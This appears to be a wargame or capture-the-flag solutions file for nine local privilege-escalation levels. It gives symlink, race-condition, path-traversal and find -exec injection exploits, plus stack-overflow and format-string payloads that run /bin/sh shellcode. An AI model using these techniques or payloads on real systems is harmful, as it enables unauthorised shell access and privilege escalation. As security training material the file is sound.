LEVEL1 

Create symbolic link from ~/.secret to /var/challenge/level1/.secret
ln -s /var/challenge/level1/.secret ~/.secret 

This produces the diff command to output a 0, enabling code execution and
spawning the shell


LEVEL2 

Replace the script file while the process is sleeping

Inject the code to pass the level and erase the temporal file


LEVEL3 

Absolute pwnage (exploit backwards file traversal):
./3 ../../../../../usr/local/bin/l33t


LEVEL4 

Exploit find -exec command 

./4 "v4l3r0n -exec /usr/local/bin/l33t {} +"


LEVEL5 

Overflow buffer with argv[2] and produce execution of l33t
./5 sort g0mQHfRQXSNDbaPwPT0vgC60kZ6B9PltZNMvCZbWrNVEvWlbA9q18IjVYpuQTItk9TJlAHx6t29ZtR81OH3LY8jSdvpkOo74kOiwxnTluaegVfhdBcfFJOhTEDyy331NYeKNf97nMcLobNRPFLyJZ1M8amp25MBd11Zq8X096A9b37oEkaRyxFXnr3OtAAIQ/usr/local/bin/l33t


LEVEL6 

/**
* Buffer overflow exploitation 23 byte bin/sh shellcode
* Shellcode in environment using address 0xbfffffcc
* Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
* To avoid the first boundary checking, an integer overflow must be performed. The return address is overwritten byte by byte due to a buffer overflow. Indexes 44,45,46,47.
*
* v4l3r0n
**/



LEVEL7 

/**
* Buffer overflow exploitation 23 byte bin/sh shellcode
* Shellcode in env using address 0xbfffffcc
* Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
*
* Segmentation fault by giving three 64 byte inputs.
* Obtain ret address by try and error and redirect to shell code stored in environment
* v4l3r0n
**/



LEVEL8 

/**
* Format string exploitation 23 byte bin/sh shellcode
* Shellcode in env using address 0xbfffffcc
* Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
*
* v4l3r0n
**/

In order to run the program we must execute it from our home directory and create both sudoers and sudolog files

        /*Split shellcode address in two decimal numbers 49151-65484 that will be the amount of bytes to traverse.
         *  We must substract to 49151 the amount of bytes already traversed
         *  - 6 of the file log
         *  - 10 of the snprintf input given by us.
         *  We must substract 49135 to 65484 to obtain the additional bytes we need to traverse
         * 65484 - 49135 = 16333
	 *
	 * Our final input must be - AA\x2a\xa0\x04\x08\x28\xa0\x04\x08%49135x%70$hn%16333x%71$hn
        */




LEVEL9 

/**
* Buffer overflow with 23 byte bin/sh shellcode
* Shellcode in env using address ~0xbfffffbc (included NOP sled to avoid exact calculation)
* Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
*
* Target buffer of 384 bytes.  384 bytes inserted as argument, 28 through SEPARATOR env variable (retrieved by target program).
*
* Vulnerable program takes SEPARATOR from the environment, that allows us to overflow the buffer
* The return address is 24 bytes ahead of the buffer
* Must input a valid address just after the separator as the program expects it
* v4l3r0n
**/



